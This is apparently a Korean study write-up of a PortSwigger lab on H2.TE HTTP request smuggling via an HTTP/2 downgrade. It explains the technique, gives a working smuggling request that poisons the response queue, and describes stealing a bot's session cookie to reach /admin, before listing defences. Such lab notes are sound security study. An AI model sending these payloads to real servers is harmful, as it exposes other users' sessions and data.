# Lab: H2.TE request smuggling — Response queue poisoning

## 개요

- **난이도**: Expert
- **주제**: HTTP Request Smuggling — HTTP/2 다운그레이드 / H2.TE / 응답 큐 오염
- **링크**: https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

## 목표

HTTP/2 → HTTP/1.1 다운그레이드 구조에서 `Transfer-Encoding: chunked` 헤더를 주입해 H2.TE 스머글링을 수행하고, 응답 큐를 오염시켜 다른 사용자(봇)의 세션 쿠키를 탈취한다.

## 이전 랩들과의 차이 — HTTP/2 스머글링

```
[001~007 — HTTP/1.1 기반 스머글링]
  Content-Length 또는 Transfer-Encoding 헤더를
  공격자가 직접 조작해서 모호성 유발
  CL.TE 또는 TE.CL 구조

[008 (이번) — HTTP/2 기반 스머글링 (H2.TE)]
  프론트엔드: HTTP/2 사용
  백엔드:    HTTP/1.1 사용 (다운그레이드)
  → HTTP/2 에는 CL/TE 헤더가 원래 없어도 공격 성립
  → HTTP/2 요청에 Transfer-Encoding: chunked 를 주입
    프론트엔드가 그대로 백엔드로 전달
    백엔드(HTTP/1.1): TE 로 파싱 → 스머글링 발생
```

## HTTP/2 와 HTTP/1.1 의 차이

```
[HTTP/1.1]
  텍스트 기반 프로토콜
  Content-Length, Transfer-Encoding 으로 메시지 경계 표현
  → 두 헤더가 충돌하면 모호성 발생 → 스머글링 가능

[HTTP/2]
  바이너리 프레이밍 프로토콜
  각 요청/응답은 독립적인 스트림 (프레임 단위)
  → 메시지 경계가 프레임으로 명확히 구분
  → CL/TE 헤더 없어도 경계 인식 가능
  → 이론적으로 스머글링 불가능

[다운그레이드 환경에서 취약]
  프론트엔드(H2) → 백엔드(HTTP/1.1) 변환 시
  HTTP/2 헤더를 HTTP/1.1 헤더로 그대로 변환
  → 공격자가 TE 헤더를 HTTP/2 요청에 삽입
  → 프론트엔드: H2 프레임 크기로 본문 파악 (TE 무시)
  → 백엔드(HTTP/1.1): TE 헤더 발견 → chunked 로 파싱
  → 불일치 발생 → 스머글링 가능
```

## H2.TE 스머글링 원리

```
[공격자 H2 요청]
  :method POST
  :path /
  :authority LAB-ID.web-security-academy.net
  transfer-encoding: chunked     ← HTTP/2 에서는 의미 없지만 삽입 가능
  content-type: application/x-www-form-urlencoded

  0\r\n\r\n                      ← chunked 종료
  GET /admin HTTP/1.1\r\n        ← smuggled 요청
  Host: LAB-ID.web-security-academy.net\r\n
  \r\n

[프론트엔드 처리]
  HTTP/2 프레임 크기로 전체 본문 파악
  transfer-encoding 헤더를 HTTP/1.1 로 변환해 백엔드에 전달

[백엔드 처리 (HTTP/1.1)]
  Transfer-Encoding: chunked 발견 → chunked 로 파싱
  0\r\n\r\n → 청크 종료
  GET /admin ... → 버퍼 잔류

→ 이후 다음 사용자 요청이 smuggled GET /admin 응답을 받음
```

## 응답 큐 오염 (Response Queue Poisoning)

```
[일반적인 스머글링 — 차별적 응답]
  Attack → 200
  Probe  → 404 (smuggled 경로)
  → 1:1 대응, 개별 요청에 영향

[응답 큐 오염]
  Attack (POST /) → 200                     ← 공격자에게 반환
  Smuggled (GET /admin) → admin 응답         ← 다음 사용자에게 반환
  다음 사용자 요청 → POST / 응답 (200)       ← 또 다음 사용자에게 반환

  응답이 한 칸씩 밀림:
  사용자 A → 관리자 응답 수신 (세션 쿠키 노출)
  사용자 B → 사용자 A 의 응답 수신
  ...

[지속적 오염]
  하나의 Attack 으로 이후 모든 사용자의 응답이 잘못 매핑됨
  → 세션 토큰, 민감 데이터 대규모 노출 가능
```

## 공격 단계

### 1단계 — H2.TE Attack (응답 큐 오염)

Burp Repeater 에서 HTTP/2 프로토콜로 전송:

```
POST / HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: LAB-ID.web-security-academy.net
\r\n
```

```
/x: 존재하지 않는 경로 → 404 반환
→ 이 404 가 다음 사용자 응답으로 매핑됨
→ 응답 큐가 1칸 밀림

또는 /admin 경로를 심어 admin 응답을 다음 사용자에게 전달
```

### 2단계 — 봇 세션 탈취

봇이 주기적으로 접속 → 응답 큐 오염으로 봇의 응답이 공격자에게 반환될 때:

```
공격자가 받은 응답:
  HTTP/1.1 302 Found
  Location: /my-account
  Set-Cookie: session=BOT_SESSION_TOKEN   ← 봇 세션 노출!
```

반복 시도로 봇 세션 토큰 획득 → `/admin` 접근 → carlos 삭제

## HTTP/1.1 스머글링과의 핵심 비교

| 항목 | HTTP/1.1 스머글링 | H2.TE 스머글링 |
|------|-----------------|---------------|
| 프론트엔드 프로토콜 | HTTP/1.1 | **HTTP/2** |
| 공격 헤더 삽입 | 직접 CL/TE 조작 | **H2 요청에 TE 주입** |
| CL/TE 필요 여부 | 반드시 필요 | **원래 없어도 됨** |
| 응답 오염 범위 | 개별 요청 | **큐 전체 오염 가능** |
| 탐지 난이도 | 상대적으로 쉬움 | **어려움** |

## 핵심 정리

- HTTP/2 는 바이너리 프레이밍으로 요청 경계를 명확히 하지만, 백엔드와 HTTP/1.1 로 통신할 때(다운그레이드) 취약해진다.
- HTTP/2 요청에 `Transfer-Encoding: chunked` 를 임의로 삽입하면, 프론트엔드는 H2 프레임으로, 백엔드는 TE 로 파싱 → 불일치 발생.
- **응답 큐 오염**은 이후 모든 사용자의 응답이 한 칸씩 밀리는 효과로, 다른 사용자의 세션 토큰과 민감 데이터를 대규모로 노출시킬 수 있다.
- CL/TE 헤더가 원래 존재하지 않아도 H2 다운그레이드 환경에서는 스머글링이 성립한다.

## 배운 점

### 1. HTTP/2 다운그레이드가 취약한 이유

```
HTTP/2 설계 목표: CL/TE 모호성 완전 제거
실제 배포 환경:   프론트엔드(H2) → 백엔드(HTTP/1.1) 혼재

→ H2 의 안전성이 다운그레이드 과정에서 소실
→ 공격자가 H2 헤더 공간을 이용해 HTTP/1.1 취약점을 유발
```

### 2. H2.TE vs H2.CL

```
[H2.TE (이번 랩)]
  HTTP/2 요청에 Transfer-Encoding: chunked 주입
  백엔드(HTTP/1.1): TE 로 파싱 → 0\r\n\r\n 이후 버퍼 잔류

[H2.CL]
  HTTP/2 요청에 Content-Length 주입
  프론트엔드(H2): 프레임 크기로 전달
  백엔드(HTTP/1.1): CL 바이트만 읽고 나머지 버퍼 잔류
  → TE.CL 와 유사한 구조
```

### 3. 응답 큐 오염의 위험성

```
[일반 스머글링]
  피해자: 내가 선택
  영향:   개별 요청

[응답 큐 오염]
  피해자: 임의의 다음 사용자
  영향:   연속된 다수 사용자
  → 세션 토큰 대량 탈취 가능
  → 기밀 데이터 랜덤 노출
  → 서비스 가용성 저하
```

### 4. 방어 방법

```
1. HTTP/2 엔드투엔드 사용
   프론트엔드-백엔드 간도 HTTP/2 유지
   → 다운그레이드 제거 → H2.TE/H2.CL 불가

2. H2 요청에서 TE/CL 헤더 제거
   프론트엔드가 백엔드로 전달 전 해당 헤더 삭제

3. 백엔드 연결 재사용 비활성화
   요청마다 새 연결 → 버퍼 잔류 불가 (성능 저하)
```
